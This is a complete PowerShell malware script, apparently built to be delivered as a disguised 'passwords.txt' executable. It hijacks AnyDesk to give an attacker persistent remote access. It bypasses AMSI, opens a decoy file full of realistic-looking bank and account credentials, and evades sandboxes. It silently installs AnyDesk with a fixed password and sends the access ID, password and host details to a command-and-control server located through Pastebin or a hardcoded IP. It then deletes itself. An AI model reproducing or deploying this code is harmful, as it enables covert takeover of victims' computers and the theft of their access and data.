# ============================================================================
# ANYTIME PAYLOAD - AnyDesk Hijacking with Decoy
# ============================================================================
# Purpose: Hijack existing AnyDesk installation for persistent remote access
# Execution: One-shot, self-destructs after completion
# Target: < 10 seconds execution time
# ============================================================================

# === AMSI BYPASS (CRITICAL FIRST STEP) ===
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# === ERROR SUPPRESSION ===
$ErrorActionPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# === DECOY CREATION (IMMEDIATE, VISIBLE) ===
# Write fake passwords.txt file
$fakePasswords = @"
bgardner57@yahoo.com
Samantha04!

work email robert.gardner@mavengroup.net
mustFTW!2025

BANK OF AMERICA ONLINE BANKING !!!
username: bob.gardner
password: Murphy2019!
(has 2 factor auth - code is usually 123456 or 000000)

facebook bob.gardner.7314
Samantha04!

Wells Fargo online
user: BGARDNER4782
Murphy#2019
security question = Murphy

Social Security - mySocialSecurity account
bobgardner1957 / Murphy#2019

Medicare.gov login
same as SS account

CVS pharmacy
bobgardner / Samantha04!
prescription ready text alerts

AARP membership # 4382991847
login: bgardner57@yahoo.com / AARP2020

amazon - same as yahoo email

netflix bgardner57@yahoo.com / Netflix$Family
sam knows this one

Xfinity/Comcast
account# 8774 4382 9918 2847
bgardner / Murphy2019!
email: robert.gardner472@sbcglobal.net

Fidelity retirement account
user: BOBGARDNER
password: Fidelity$2018

wifi: NETGEAR73 / Murphy2019!

United MileagePlus# 8847392018
bobgardner1957 / United2020

ebay acct - bgardner47 / Samantha04!

paypal = yahoo login

microsoft acct same as work email

DTE Energy online
acct 2847-3821-9918
bobgardner / DTEaccess2021
"@

try {
    [System.IO.File]::WriteAllText("$PWD\passwords.txt", $fakePasswords, [System.Text.Encoding]::UTF8)
    
    # Open in notepad immediately (non-blocking)
    Start-Process notepad.exe -ArgumentList "$PWD\passwords.txt" -WindowStyle Normal
} catch {}

# === SANDBOX EVASION ===
Start-Sleep -Milliseconds 3000

# === PERFORMANCE TIMER ===
$timer = [System.Diagnostics.Stopwatch]::StartNew()

try {
    # === FETCH C2 IP ADDRESS ===
    $c2Ip = $null
    try {
        # Try to fetch from Pastebin (same method as receiver.py)
        $configUrl = "https://pastebin.com/raw/YgNuztHj"
        $c2Ip = (Invoke-RestMethod -Uri $configUrl -TimeoutSec 3 -EA 0).Trim()
        if (-not $c2Ip) {
            $c2Ip = $null
        }
    } catch {}
    
    # Fallback to hardcoded IP
    if (-not $c2Ip) {
        $c2Ip = "52.21.29.104"
    }
    
    $c2Port = 8080
    $c2Url = "http://${c2Ip}:${c2Port}/report"
    
    # === ANYDESK DISCOVERY ===
    function Find-AnyDesk {
        # TIER 1: Zero-cost checks (< 50ms) - Running process
        $proc = Get-Process -Name "AnyDesk" -EA 0 | Select-Object -First 1
        if ($proc) {
            $path = $proc.Path
            if ($path -and (Test-Path $path)) {
                return $path
            }
        }
        
        # TIER 2: Direct path checks (< 150ms) - Extended common locations
        $paths = @(
            # Standard installations
            "${env:ProgramFiles(x86)}\AnyDesk\AnyDesk.exe",
            "$env:ProgramFiles\AnyDesk\AnyDesk.exe",
            
            # User directories
            "$env:USERPROFILE\Desktop\AnyDesk.exe",
            "$env:USERPROFILE\Downloads\AnyDesk.exe",
            "$env:USERPROFILE\Documents\AnyDesk.exe",
            
            # AppData (portable installations sometimes cache here)
            "$env:APPDATA\AnyDesk\AnyDesk.exe",
            "$env:LOCALAPPDATA\AnyDesk\AnyDesk.exe",
            
            # Public locations
            "$env:PUBLIC\Desktop\AnyDesk.exe",
            "$env:PUBLIC\Documents\AnyDesk.exe",
            
            # Root and common tool directories
            "C:\AnyDesk.exe",
            "C:\Tools\AnyDesk.exe",
            "C:\Apps\AnyDesk.exe",
            "C:\Programs\AnyDesk.exe"
        )
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                return $path
            }
        }
        
        # TIER 3: Shallow recursive search (< 2 seconds) - Extended user directories
        $searchDirs = @(
            @{Path="$env:USERPROFILE\Desktop"; Depth=2},
            @{Path="$env:USERPROFILE\Downloads"; Depth=2},
            @{Path="$env:USERPROFILE\Documents"; Depth=2}
        )
        
        foreach ($dir in $searchDirs) {
            if (Test-Path $dir.Path) {
                $found = Get-ChildItem -Path $dir.Path -Filter "AnyDesk.exe" -Recurse -EA 0 -Depth $dir.Depth | Select-Object -First 1
                if ($found) {
                    return $found.FullName
                }
            }
        }
        
        return $null
    }
    
    $anydesk = Find-AnyDesk
    if (-not $anydesk) {
        exit 0  # Silent failure - no AnyDesk found
    }
    
    # === SILENT INSTALLATION ===
    $installPath = "${env:ProgramFiles(x86)}\AnyDesk"
    $null = Start-Process -FilePath $anydesk -ArgumentList "--install `"$installPath`" --start-with-win --silent" -NoNewWindow -Wait 2>&1
    Start-Sleep -Milliseconds 1500
    
    # Check if installation succeeded
    $installedExe = "$installPath\AnyDesk.exe"
    if (Test-Path $installedExe) {
        $anydeskFinal = $installedExe
    } else {
        $anydeskFinal = $anydesk
    }
    
    # Verify AnyDesk service is running
    $service = Get-Service -Name "AnyDesk" -EA 0
    if (-not $service -or $service.Status -ne 'Running') {
        # Try to start it manually
        Start-Service -Name "AnyDesk" -EA 0
        Start-Sleep -Milliseconds 500
    }
    
    # === PASSWORD SETTING ===
    $password = "secretsauce123"
    $null = echo $password | & $anydeskFinal --set-password 2>&1
    
    # === ID RETRIEVAL ===
    $id = (& $anydeskFinal --get-id 2>&1).Trim()
    
    # Validate ID retrieval succeeded
    if (-not $id -or $id.Length -lt 8 -or $id -match 'error|fail|invalid') {
        # Invalid ID, exit silently
        exit 0
    }
    
    # === INTELLIGENCE GATHERING ===
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $tz = Get-TimeZone
    $locale = [System.Globalization.CultureInfo]::CurrentCulture.Name
    
    # Get local IP (first non-loopback, non-link-local IPv4)
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {
        $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*"
    } | Select-Object -First 1).IPAddress
    
    if (-not $localIP) {
        $localIP = "unavailable"
    }
    
    # Get external IP (with timeout to keep execution fast)
    $externalIP = $null
    if ($timer.Elapsed.TotalSeconds -lt 4.5) {
        try {
            $externalIP = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text' -TimeoutSec 1 -EA 0).Trim()
        } catch {
            $externalIP = "unavailable"
        }
    } else {
        $externalIP = "unavailable"
    }
    
    # === BUILD REPORT ===
    $report = @{
        id = $id
        password = $password
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os_version = $os
        timezone = $tz.Id
        timezone_offset = $tz.BaseUtcOffset.TotalHours
        locale = $locale
        local_ip = $localIP
        external_ip = $externalIP
        execution_time = [math]::Round($timer.Elapsed.TotalSeconds, 2)
    }
    
    # === REPORTING TO C2 (with retry logic) ===
    $maxRetries = 2
    $retryDelay = 500  # milliseconds
    
    for ($i = 0; $i -lt $maxRetries; $i++) {
        try {
            $response = Invoke-RestMethod -Uri $c2Url `
                -Method POST `
                -Body ($report | ConvertTo-Json) `
                -ContentType 'application/json' `
                -TimeoutSec 2 `
                -EA Stop
            break  # Success, exit loop
        } catch {
            if ($i -lt ($maxRetries - 1)) {
                Start-Sleep -Milliseconds $retryDelay
                $retryDelay *= 2  # Exponential backoff
            }
        }
    }
    
} catch {
    # Complete silence on error
} finally {
    $timer.Stop()
}

# === SELF-DESTRUCT ===
# Delete both .bat and .exe versions using pure PowerShell
# Spawn background job with delay to allow parent process to exit
$batPath = "$PWD\passwords.txt.bat"
$exePath = "$PWD\passwords.txt.exe"

$deleteScript = {
    param($bat, $exe)
    Start-Sleep -Seconds 3
    if (Test-Path $bat) { Remove-Item $bat -Force -EA 0 }
    if (Test-Path $exe) { Remove-Item $exe -Force -EA 0 }
}

Start-Job -ScriptBlock $deleteScript -ArgumentList $batPath, $exePath | Out-Null

exit 0

